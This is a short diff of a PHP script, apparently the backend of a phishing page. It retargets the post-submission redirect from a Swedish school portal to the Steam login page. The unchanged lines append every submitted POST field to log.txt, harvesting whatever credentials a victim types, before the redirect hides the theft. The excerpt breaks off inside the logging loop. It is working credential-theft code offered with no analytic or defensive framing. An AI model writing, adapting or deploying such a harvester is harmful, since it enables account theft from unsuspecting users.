@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://dexter.uddevalla.se/');
+header ('Location: https://steamcommunity.com/login/home/?goto=');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
